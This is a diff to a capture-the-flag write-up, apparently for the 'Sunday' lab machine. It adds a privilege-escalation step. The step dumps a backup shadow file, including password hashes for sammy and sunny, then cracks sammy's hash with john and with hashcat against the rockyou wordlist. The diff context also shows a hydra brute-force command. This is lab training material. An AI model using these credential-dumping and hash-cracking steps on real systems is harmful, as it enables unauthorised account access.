@@ -73,7 +73,45 @@ hydra -L users.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt 10.1
 
 ## Privilege Escalation:
 + We need to escalate our privileges to Sammy.
-  
++ Check **shadow.backup** in **/backup** directory.
++ It's a backup of the shadow file.
+```
+sunny@sunday:/backup$ cat shadow.backup 
+mysql:NP:::::::
+openldap:*LK*:::::::
+webservd:*LK*:::::::
+postgres:NP:::::::
+svctag:*LK*:6445::::::
+nobody:*LK*:6445::::::
+noaccess:*LK*:6445::::::
+nobody4:*LK*:6445::::::
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/902fc75b-9066-4b8d-801d-16e692e7082f)
+
++ We already know sunny's password therefore we're not going to crack it.
++ Use john or hashcat to crack the hash.
+
++ **Using john:**
++ Now, copy **sammy**'s password hash, and save it in the file **hash.txt**. 
++ `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/321c70bc-5af0-4fd6-92c4-5b02ae02a4a4)
+
++ **Using hashcat:**
++ Now, copy all line of sammy's password hash after sammy, and save in the **hash** file.
++ Specify the hash type from checking [hashcat.net](https://hashcat.net/wiki/doku.php?id=example_hashes).
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f0658f0b-36d3-4081-9d7a-4c93ece481f0)
+
++ `hashcat -m 7400 hash /usr/share/wordlists/rockyou.txt --force`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b004bd76-5a97-48ee-96b0-52036b0aeec1)
+
+
+
 
 # References & Alternatives:
 + https://vvmlist.github.io/#poison
